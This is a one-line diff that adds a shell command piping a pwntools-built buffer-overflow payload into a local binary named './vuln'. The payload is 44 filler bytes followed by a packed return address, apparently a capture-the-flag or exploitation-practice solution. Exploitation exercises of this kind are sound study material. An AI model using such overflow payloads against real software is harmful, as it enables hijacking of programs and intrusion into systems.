@@ -1,0 +1,1 @@
+python -c "from pwn import *;print('a' * (32+12) + str(p32(0x080485cb)))" | ./vuln
